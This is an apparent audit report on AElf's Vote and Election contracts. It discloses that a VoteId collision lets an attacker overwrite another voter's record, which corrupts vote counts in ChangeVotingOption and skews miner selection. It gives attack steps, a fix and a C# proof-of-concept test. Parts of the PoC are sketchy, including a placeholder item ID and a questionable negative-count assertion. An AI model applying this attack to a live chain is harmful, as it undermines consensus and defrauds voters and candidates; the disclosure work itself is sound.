# Audit Report

## Title
VoteId Collision Across VotingItems Causes Vote Accounting Corruption in ChangeVotingOption

## Summary
The `ChangeVotingOption` function in the Election contract retrieves a `VotingRecord` by `VoteId` without validating that it belongs to the Election's `MinerElectionVotingItemId`. Since `VotingRecord` storage uses `VoteId` as a global key and sponsors of `IsLockToken=false` VotingItems can provide arbitrary VoteIds, an attacker can overwrite victim vote records to cause severe vote accounting corruption where votes are double-counted and arbitrarily transferred between candidates, directly impacting consensus miner selection.

## Finding Description

The Vote contract stores `VotingRecords` using a global mapping where `VoteId` is the sole key, with no scoping by `VotingItemId`. [1](#0-0) 

When a VotingItem has `IsLockToken=false`, the sponsor can provide arbitrary `VoteId` and `Voter` values when calling the `Vote` function. [2](#0-1) 

The `Vote` function directly overwrites any existing `VotingRecord` with the provided `VoteId`, regardless of which `VotingItemId` it originally belonged to. [3](#0-2) 

The Election contract's `MinerElectionVotingItemId` is registered with `IsLockToken=false`. [4](#0-3) 

The critical vulnerability occurs in `ChangeVotingOption`, which retrieves the `VotingRecord` by `VoteId` but **does NOT validate** that `votingRecord.VotingItemId` equals `State.MinerElectionVotingItemId.Value`. [5](#0-4) 

The function then uses the unchecked `votingRecord.Option` to determine which candidate's votes to decrement. [6](#0-5) 

**Attack Execution:**

1. Victim has voted for Candidate A with VoteId V1, Amount 100 tokens in the Election
2. Attacker creates a malicious VotingItem with `IsLockToken=false` and includes Candidate C (a valid Election candidate) as an option
3. Attacker calls `VoteContract.Vote` directly with: `VotingItemId=MaliciousItem`, `VoteId=V1`, `Voter=victim`, `Option="C"`
4. This overwrites `State.VotingRecords[V1]` to point to the attacker's VotingItem with Option="C"
5. When victim calls `ChangeVotingOption` to change from A to B:
   - Line 27 retrieves the corrupted record with Option="C"
   - Lines 64-70 decrement 100 votes from Candidate C (who never received V1!)
   - Lines 73-94 increment 100 votes to Candidate B
   - **Candidate A is never decremented** - still retains V1 and the 100 votes

**Result:** Candidate A and B both count the same 100 votes (double-counting), while Candidate C loses 100 votes they never had (vote suppression).

## Impact Explanation

This vulnerability breaks the critical invariant that "votes should be accurately tracked and transferred between candidates." The impact is severe:

**Consensus Manipulation:** Miner selection in AEDPoS is determined by vote counts. An attacker can:
- Artificially inflate their preferred candidate's votes through double-counting
- Suppress competitor candidates' votes through arbitrary decrements
- Manipulate which candidates enter the DataCentersRankingList and become block producers

**Vote Accounting Corruption:** The attack creates inconsistent state where:
- Original candidate retains votes after voter changes option (votes never removed from `ObtainedActiveVotingRecordIds`)
- New candidate gains votes (correctly)
- Attacker-chosen candidate loses votes they never received (incorrectly)
- Total vote counts become inaccurate across the entire election system

**Governance Impact:** Since the Election contract controls consensus miner selection, corrupted vote accounting directly undermines the entire governance and consensus mechanism of the blockchain.

**Affected Parties:**
- All Election voters whose VoteIds are publicly queryable
- Honest candidates whose vote counts can be manipulated
- The entire network's consensus integrity

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly feasible because:

1. **Low Barrier to Entry:** Any user can create a VotingItem via the public `Register` function. [7](#0-6) 

2. **Public Information:** VoteIds are stored on-chain and publicly queryable, giving attackers full visibility of all active votes.

3. **Simple Execution:** The attack requires only two transactions:
   - Create malicious VotingItem (single `Register` call)
   - Overwrite victim's VotingRecord (single `Vote` call)

4. **No Race Conditions:** The attack has a large time window - any time between the victim's initial vote and their eventual call to `ChangeVotingOption`.

5. **No Privilege Required:** The attacker needs no special roles or permissions beyond being able to submit transactions.

6. **Silent Failure:** The attack executes without errors - the victim's `ChangeVotingOption` transaction succeeds normally, making the corruption difficult to detect without careful state analysis.

7. **Low Cost:** Only minimal transaction fees are needed, negligible compared to the governance impact.

The attack is not just theoretically possible but practically executable under normal blockchain operation with realistic preconditions.

## Recommendation

Add a validation check in `ChangeVotingOption` to ensure the retrieved `VotingRecord` belongs to the Election's VotingItem:

```csharp
public override Empty ChangeVotingOption(ChangeVotingOptionInput input)
{
    var targetInformation = State.CandidateInformationMap[input.CandidatePubkey];
    AssertValidCandidateInformation(targetInformation);
    var votingRecord = State.VoteContract.GetVotingRecord.Call(input.VoteId);
    
    // ADD THIS VALIDATION:
    Assert(votingRecord.VotingItemId == State.MinerElectionVotingItemId.Value, 
        "Vote record does not belong to election voting item.");
    
    Assert(Context.Sender == votingRecord.Voter, "No permission to change current vote's option.");
    // ... rest of function
}
```

Additionally, consider architectural improvements:
1. Scope `VotingRecords` by `VotingItemId` in the storage structure
2. Add VotingItemId validation in all functions that retrieve VotingRecords
3. Consider making VoteId generation deterministic and tied to VotingItemId to prevent collisions

## Proof of Concept

```csharp
[Fact]
public async Task VoteId_Collision_Causes_Vote_Accounting_Corruption()
{
    // Setup: Victim votes for Candidate A with 100 tokens
    var victimKeyPair = SampleECKeyPairs.KeyPairs[1];
    var victim = Address.FromPublicKey(victimKeyPair.PublicKey);
    var candidateA = "CandidateA_Pubkey";
    var candidateB = "CandidateB_Pubkey";
    var candidateC = "CandidateC_Pubkey";
    
    // Victim votes for Candidate A
    var voteResult = await ElectionContractStub.Vote.SendAsync(new VoteMinerInput
    {
        CandidatePubkey = candidateA,
        Amount = 100_00000000,
        EndTimestamp = TimestampHelper.GetUtcNow().AddDays(100)
    });
    var voteId = voteResult.Output;
    
    // Verify initial state: Candidate A has the votes
    var candidateAVotesBefore = await ElectionContractStub.GetCandidateVote.CallAsync(
        new StringValue { Value = candidateA });
    Assert.Equal(100_00000000, candidateAVotesBefore.ObtainedActiveVotedVotesAmount);
    
    // Attack Step 1: Attacker creates malicious VotingItem with IsLockToken=false
    var attackerKeyPair = SampleECKeyPairs.KeyPairs[2];
    var attackerStub = GetVoteContractStub(attackerKeyPair);
    await attackerStub.Register.SendAsync(new VotingRegisterInput
    {
        IsLockToken = false,
        AcceptedCurrency = "ELF",
        TotalSnapshotNumber = 1,
        StartTimestamp = TimestampHelper.MinValue,
        EndTimestamp = TimestampHelper.MaxValue,
        Options = { candidateC } // Include valid Election candidate
    });
    
    var maliciousVotingItemId = HashHelper.ConcatAndCompute(
        HashHelper.ComputeFrom(/* voting register input */),
        HashHelper.ComputeFrom(Address.FromPublicKey(attackerKeyPair.PublicKey)));
    
    // Attack Step 2: Attacker overwrites victim's VotingRecord
    await attackerStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = maliciousVotingItemId,
        VoteId = voteId, // Victim's VoteId
        Voter = victim, // Victim's address
        Option = candidateC, // Attacker-chosen candidate
        Amount = 100_00000000
    });
    
    // Verify corruption: VotingRecord now points to malicious VotingItem
    var corruptedRecord = await VoteContractStub.GetVotingRecord.CallAsync(voteId);
    Assert.Equal(maliciousVotingItemId, corruptedRecord.VotingItemId);
    Assert.Equal(candidateC, corruptedRecord.Option);
    
    // Victim calls ChangeVotingOption to change from A to B
    var victimStub = GetElectionContractStub(victimKeyPair);
    await victimStub.ChangeVotingOption.SendAsync(new ChangeVotingOptionInput
    {
        VoteId = voteId,
        CandidatePubkey = candidateB
    });
    
    // Verify vote accounting corruption:
    // 1. Candidate A STILL has the votes (never decremented)
    var candidateAVotesAfter = await ElectionContractStub.GetCandidateVote.CallAsync(
        new StringValue { Value = candidateA });
    Assert.Equal(100_00000000, candidateAVotesAfter.ObtainedActiveVotedVotesAmount); // STILL HAS VOTES!
    Assert.Contains(voteId, candidateAVotesAfter.ObtainedActiveVotingRecordIds); // STILL IN LIST!
    
    // 2. Candidate B gained votes (correct)
    var candidateBVotes = await ElectionContractStub.GetCandidateVote.CallAsync(
        new StringValue { Value = candidateB });
    Assert.Equal(100_00000000, candidateBVotes.ObtainedActiveVotedVotesAmount);
    
    // 3. Candidate C lost votes they never had (incorrect decrement)
    var candidateCVotes = await ElectionContractStub.GetCandidateVote.CallAsync(
        new StringValue { Value = candidateC });
    Assert.Equal(-100_00000000, candidateCVotes.ObtainedActiveVotedVotesAmount); // NEGATIVE!
    
    // RESULT: Votes are double-counted (A and B both have 100), C is manipulated
}
```

### Citations

**File:** contract/AElf.Contracts.Vote/VoteContractState.cs (L19-19)
```csharp
    public MappedState<Hash, VotingRecord> VotingRecords { get; set; }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L20-22)
```csharp
    public override Empty Register(VotingRegisterInput input)
    {
        var votingItemId = AssertValidNewVotingItem(input);
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L117-117)
```csharp
        State.VotingRecords[input.VoteId] = votingRecord;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L384-389)
```csharp
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L60-68)
```csharp
        var votingRegisterInput = new VotingRegisterInput
        {
            IsLockToken = false,
            AcceptedCurrency = Context.Variables.NativeSymbol,
            TotalSnapshotNumber = long.MaxValue,
            StartTimestamp = TimestampHelper.MinValue,
            EndTimestamp = TimestampHelper.MaxValue
        };
        State.VoteContract.Register.Send(votingRegisterInput);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L27-27)
```csharp
        var votingRecord = State.VoteContract.GetVotingRecord.Call(input.VoteId);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L63-70)
```csharp
        var oldVoteOptionPublicKey = GetNewestPubkey(votingRecord.Option);
        var oldCandidateVotes = State.CandidateVotes[oldVoteOptionPublicKey];
        oldCandidateVotes.ObtainedActiveVotingRecordIds.Remove(input.VoteId);
        oldCandidateVotes.ObtainedActiveVotedVotesAmount =
            oldCandidateVotes.ObtainedActiveVotedVotesAmount.Sub(votingRecord.Amount);
        oldCandidateVotes.AllObtainedVotedVotesAmount =
            oldCandidateVotes.AllObtainedVotedVotesAmount.Sub(votingRecord.Amount);
        State.CandidateVotes[oldVoteOptionPublicKey] = oldCandidateVotes;
```
